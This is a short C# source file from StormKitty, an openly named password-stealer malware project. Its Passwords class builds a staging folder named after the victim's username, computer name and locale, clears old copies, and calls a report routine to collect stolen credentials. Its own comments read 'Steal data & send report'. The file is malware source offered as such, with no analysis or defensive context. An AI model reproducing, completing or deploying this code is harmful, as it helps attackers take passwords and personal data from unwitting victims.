using StormKitty;
using System;
using System.IO;

namespace Stealer
{
    internal sealed class Passwords
    {
        // Stealer modules
        private static string PasswordsStoreDirectory = Path.Combine(
            Paths.InitWorkDir(),
            SystemInfo.username + "@" + SystemInfo.compname + "_" + SystemInfo.culture);

        // Steal data & send report
        public static string Save()
        {
            Console.WriteLine("Running passwords recovery...");
            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
            else try { Filemanager.RecursiveDelete(PasswordsStoreDirectory); } catch { Console.WriteLine("Failed recursive remove directory");  };
            
            if (Report.CreateReport(PasswordsStoreDirectory))
                return PasswordsStoreDirectory;
            return "";
        }

    }
}
